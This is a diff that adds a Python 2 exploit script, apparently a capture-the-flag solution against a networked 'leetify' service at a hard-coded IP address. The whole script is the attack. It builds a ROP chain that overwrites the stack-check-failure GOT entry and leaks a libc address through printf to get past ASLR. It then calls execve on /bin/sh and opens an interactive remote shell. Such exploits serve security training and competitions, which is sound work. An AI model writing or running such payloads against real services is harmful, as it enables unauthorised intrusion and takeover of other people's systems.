@@ -1,0 +1,80 @@
+
+import struct
+import socket as soc
+import telnetlib as tl
+import time
+import sys
+
+def readuntil(so, needle):
+    data = ""
+    while needle not in data:
+        data += so.recv(1)
+    return data
+
+so = soc.socket(soc.AF_INET,soc.SOCK_STREAM)
+if (len(sys.argv)>1):
+	so.connect(("202.112.26.106",5149))
+else:	
+	so.connect(("localhost",6000))
+
+print readuntil(so,"Your choice:")
+so.send("1\n")
+
+#We overwright stackcheckfail with this address
+pl=struct.pack("I",0x080485d8) #leave; ret to stage 1
+
+#Stage 2 (Write and ret2libc)
+of2=4*24
+#Move the stack forward so functions can have stack space
+pl+=struct.pack("I",0x08048b02)*20 #ret;
+
+#Read in input and then return into it
+pl+=struct.pack("I",0x80486CB) #Return to get user input
+pl+=struct.pack("I",0x08048d8d) #3 pops to align to our ret2execve
+pl+=struct.pack("I",0x804b080) #Address to write to
+pl+=struct.pack("I",0x01010101) #Size
+
+#Calculate offsets and padding
+h=13+(36/2)
+of=(h-13)*2
+pl+="H"*h
+pl+="A"*(0x100-14-h-of-of2)
+
+#First leave ret ends up here, we want jump forward to stage 1
+pl+=struct.pack("I",0x08048b01) #pop ebp ret
+
+#Overwrite strcpy argument with this address
+pl+=struct.pack("I",0x804b01c) #Stackcheckfail location
+
+#Stage 1 (Leak libc address with printf)
+pl+=struct.pack("I",0x8048D06) #Ret to printf (it does leave; ret; We pivot to stage 2)
+pl+=struct.pack("I",0x804b010) #Print some got addresses
+
+so.send(pl+"\n")
+
+#Trigger the 'H' bug in leetify
+print readuntil(so,"Your choice:")
+so.send("4\n")
+
+time.sleep(.1)
+print so.recv(1)
+#read leaked address
+nv = struct.unpack("I",so.recv(4))[0]
+print so.recv(4096)
+print hex(nv)
+
+#Calculate difference in libc
+dif = nv-0xb7e92650
+
+#Send ret2execve and "/bin/sh" locations accounting for ASLR
+pl="AAAA"
+pl+=struct.pack("I",0xb7ee2be0+dif) #execve
+pl+="AAAA"
+pl+=struct.pack("I",0xb7f8da24+dif) #/bin/sh
+pl+="\x00"*8 #null arguments
+so.send(pl+"\n")
+
+#Interact with our shell
+t = tl.Telnet()
+t.sock = so
+t.interact()
